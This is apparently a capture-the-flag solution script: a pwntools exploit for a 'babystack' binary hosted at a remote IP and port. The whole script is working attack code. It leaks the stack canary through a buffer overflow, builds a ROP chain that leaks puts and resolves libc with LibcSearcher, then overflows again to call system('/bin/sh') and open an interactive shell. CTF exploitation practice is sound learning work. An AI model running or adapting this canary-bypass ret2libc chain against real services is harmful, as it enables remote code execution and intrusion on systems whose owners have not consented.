from pwn import *
from LibcSearcher import LibcSearcher
import binascii

file_crack = './babystack'
context(os='linux', arch='i386', log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

elf = ELF(file_crack)
# n = process(file_crack)
n = remote('111.198.29.45', 30178)
# gdb.attach(n)
# sleep(2)

# get cannary
n.sendline('1')
payload = 'a' * 136
n.sendline(payload)
sleep(1)
n.sendline('2')
sleep(1)
n.recvuntil('aaaa\n')
ch =chr(0) + n.recv(7)
n.recv()
cannary = u64(ch)
log.info("cannary: " + hex(cannary))

# get libc
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
write_plt = elf.plt['write']
write_got = elf.got['write']
memset_got = elf.got['memset']
atoi_got = elf.got['atoi']
pop_rdi_ret = 0x0000000000400a93
log.info('puts_plt: ' + hex(puts_plt) + ', puts_got: ' + hex(puts_got))
n.sendline('1')
sleep(1)
payload = 'a' * 136 + p64(cannary) + 'aaaaaaaa'   # filling and fake_ebx
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(0x0000000000400908)
n.sendline(payload)
sleep(1)
n.sendline('3')
sleep(1)
n.recvuntil('>> ')
puts_addr = n.recvuntil('\n')
#puts_addr = u64(puts_addr[:-1])
log.info(puts_addr)
puts_addr = u64(puts_addr[:-1]+chr(0)+chr(0))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
log.info(libc)
log.info('libc: ' + hex(libc_base))
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('bin_sh: ' + hex(binsh_addr) + ', system: ' + hex(system_addr))

# get cannary again(waste of time, all cannary are same)
n.sendline('1')
payload = 'a' * 136
n.sendline(payload)
sleep(1)
n.sendline('2')
sleep(1)
n.recvuntil('aaaa\n')
ch =chr(0) + n.recv(7)
n.recv()
cannary = u64(ch)
log.info("cannary: " + hex(cannary))

# get shell
n.sendline('1')
sleep(1)
payload = 'a' * 136 + p64(cannary) + 'aaaaaaaa'
payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
n.sendline(payload)
sleep(1)
n.sendline('3')
sleep(1)
n.interactive()

